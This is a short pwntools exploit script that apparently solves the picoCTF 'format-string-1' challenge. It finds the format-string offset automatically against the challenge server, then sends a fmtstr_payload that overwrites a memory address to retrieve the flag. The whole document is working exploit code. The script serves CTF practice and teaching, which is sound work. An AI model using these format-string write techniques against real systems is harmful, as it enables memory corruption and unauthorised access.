from pwn import *
# context.log_level = ''
context.binary = ELF('./format-string-1')

p = remote('mimas.picoctf.net', 61017)

def exec_fmt(payload):
    p = remote('mimas.picoctf.net', 61017)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)